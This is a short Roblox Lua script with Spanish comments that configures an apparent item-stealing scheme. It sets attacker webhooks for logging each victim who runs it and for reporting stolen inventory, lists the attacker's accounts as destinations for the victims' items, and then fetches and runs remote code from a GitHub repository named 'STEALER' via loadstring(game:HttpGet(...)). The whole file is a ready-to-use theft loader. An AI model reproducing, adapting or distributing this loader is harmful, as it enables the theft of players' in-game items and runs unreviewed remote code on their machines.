-- ==========================================
-- ⚙️ CONFIGURACIÓN DEL USUARIO (EDITA AQUÍ)
-- ==========================================
getgenv().AutoTradeConfig = {
    -- Pon aquí el link de tu Webhook para ver cuando alguien ejecuta el script
    WebhookLogs = "TU_WEBHOOK_DE_LOGS_AQUI",
    
    -- Pon aquí el link de tu Webhook para ver lo que recibes
    WebhookInventario = "TU_WEBHOOK_DE_INVENTARIO_AQUI",
    
    -- Pon aquí los nombres de tus cuentas a las que irán los items
    JugadoresObjetivos = {
        "TuCuentaPrincipal1", 
        "TuCuentaSecundaria2"
    }
}

print("Configuración cargada. Iniciando sistema...")

-- ==========================================
-- 🚀 CARGA DEL SISTEMA (NO TOCAR)
-- ==========================================
loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
